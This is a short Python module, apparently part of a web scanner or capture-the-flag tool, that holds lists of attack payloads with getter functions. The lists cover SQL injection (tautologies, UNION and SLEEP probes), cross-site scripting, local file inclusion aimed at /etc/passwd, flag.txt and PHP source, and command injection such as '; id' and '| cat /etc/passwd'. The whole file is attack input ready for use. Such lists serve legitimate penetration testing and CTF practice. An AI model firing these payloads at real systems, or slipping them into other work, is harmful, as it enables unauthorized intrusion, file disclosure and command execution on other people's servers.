from typing import Any, Dict, List

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT 1,2,3 --",
    "1; SELECT SLEEP(5) --",
    "1' AND SLEEP(5) --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 10 --",
    "admin' --",
    "admin' #",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(1)",
    "<marquee onstart=alert(1)>",
]

LFI_PAYLOADS = [
    "/etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/flag.txt",
    "../../../flag.txt",
    "php://filter/convert.base64-encode/resource=index.php",
]

RCE_PAYLOADS = [
    "; id",
    "| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| cat /etc/passwd",
    "& ping -c 3 127.0.0.1",
]

def get_sqli(count: int = 20) -> List[str]:
    return SQLI_PAYLOADS[:count]

def get_xss(count: int = 15) -> List[str]:
    return XSS_PAYLOADS[:count]

def get_lfi(count: int = 15) -> List[str]:
    return LFI_PAYLOADS[:count]

def get_rce(count: int = 10) -> List[str]:
    return RCE_PAYLOADS[:count]

def payloads_all() -> Dict[str, List[str]]:
    return {"sqli": get_sqli(), "xss": get_xss(), "lfi": get_lfi(), "rce": get_rce()}
